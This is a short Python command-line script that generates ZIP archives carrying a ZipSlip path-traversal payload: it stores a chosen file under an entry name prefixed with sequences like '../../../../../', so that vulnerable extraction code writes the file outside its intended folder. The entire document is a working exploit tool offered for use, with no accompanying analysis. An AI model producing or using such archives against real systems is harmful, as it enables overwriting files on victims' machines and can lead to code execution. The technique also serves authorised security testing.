import argparse
import os
import zipfile

def create_zip(zip_name, file_path, zip_slip_path):
    """Creates a zip file with a specified ZipSlip payload."""
    # Ensure the provided file exists
    if not os.path.exists(file_path):
        print(f"Error: The file '{file_path}' does not exist.")
        return

    try:
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Construct the ZipSlip payload path
            slip_path = os.path.join(zip_slip_path, os.path.basename(file_path))
            # Add the file to the zip archive with the malicious path
            zipf.write(file_path, arcname=slip_path)

        print(f"ZIP file '{zip_name}' created successfully with ZipSlip payload.")
    except Exception as e:
        print(f"Error creating ZIP file: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create a zip file for ZipSlip exploit.")
    parser.add_argument("-n", "--name", required=True, help="Name of the ZIP file to create.")
    parser.add_argument("-p", "--path", required=True, help="Path to the file to include in the ZIP.")
    parser.add_argument("-z", "--zipslip", required=True, help="ZipSlip path prefix (e.g., ';../../../../../').")

    args = parser.parse_args()

    # Remove the leading semicolon from the -z argument if present
    zip_slip_path = args.zipslip.lstrip(';')

    create_zip(args.name, args.path, zip_slip_path)
